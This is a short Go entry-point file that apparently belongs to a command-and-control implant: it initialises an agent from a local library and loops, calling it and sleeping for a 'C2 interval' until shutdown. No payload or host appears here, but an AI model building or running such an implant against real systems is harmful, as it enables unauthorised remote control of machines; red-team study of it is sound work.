package main

import (
	"time"

	"./lib"
)

func main() {
	agent := lib.Agent{}

	agent.Init()
	for agent.IsShutdown() != true {
		agent.Run()
		time.Sleep(time.Duration(agent.GetC2Interval()) * time.Millisecond)
	}
}
